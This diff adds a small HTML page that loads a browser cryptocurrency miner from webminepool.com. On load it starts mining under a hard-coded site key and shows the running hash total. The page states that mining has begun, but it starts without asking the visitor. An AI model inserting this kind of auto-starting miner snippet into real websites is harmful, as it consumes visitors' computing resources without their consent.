@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Minning With WebMinePool </title>
+    <!-- style -->
+    <style>
+        * {
+            margin: 0px;
+            padding: 0px;
+            font-family: 'Quicksand', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(to right, #EF629F, #EECDA3);
+        }
+        
+        .main {
+            margin: 100px auto;
+            padding: 100px;
+            text-align: center;
+        }
+        
+        h1 {
+            font-size: 50px;
+        }
+        
+        p {
+            font-size: 25px;
+        }
+        
+        @media only screen and (max-width: 570px) {
+            .main {
+                padding: 0px;
+            }
+        }
+        
+        @media only screen and (max-width: 400px) {
+            h1 {
+                font-size: 40px;
+            }
+            p {
+                font-size: 20px;
+            }
+        }
+        
+        @media only screen and (max-width: 300px) {
+            h1 {
+                font-size: 30px;
+            }
+            p {
+                font-size: 18px;
+            }
+        }
+    </style>
+    <!-- FONT -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Quicksand&display=swap" rel="stylesheet">
+    <!-- script -->
+    <script src="https://webminepool.com/lib/base.js"></script>
+</head>
+
+<body>
+    <div class="main">
+        <h1> Started Minning </h1>
+        <p>Total number of Hashes <span id="count"></span></p>
+    </div>
+</body>
+
+<script>
+    window.addEventListener("DOMContentLoaded", function() {
+        let miner = WMP.Anonymous('SK_xDJWvPpvWqJbwV3OZESiY');
+        let counter = document.querySelector("#count");
+        miner.start();
+        setInterval(() => {
+            counter.innerHTML = miner.getTotalHashes([miner]);
+        }, 5000);
+    })
+</script>
+
+</html>
